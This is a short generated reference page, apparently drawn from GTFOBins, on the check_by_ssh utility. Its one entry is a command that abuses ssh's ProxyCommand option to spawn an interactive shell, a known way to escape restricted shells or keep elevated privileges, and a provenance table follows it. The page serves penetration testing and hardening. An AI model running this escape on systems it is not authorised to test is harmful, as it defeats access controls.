---
parsed_by: focuslocust
source: commands
type: generated
---
# check_by_ssh Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## check_by_ssh

Tool page: [check_by_ssh](../../tools/linux/check-by-ssh.md)

### shell

```text
check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/check_by_ssh` |
| Evidence | Function example preserved from source parser. |
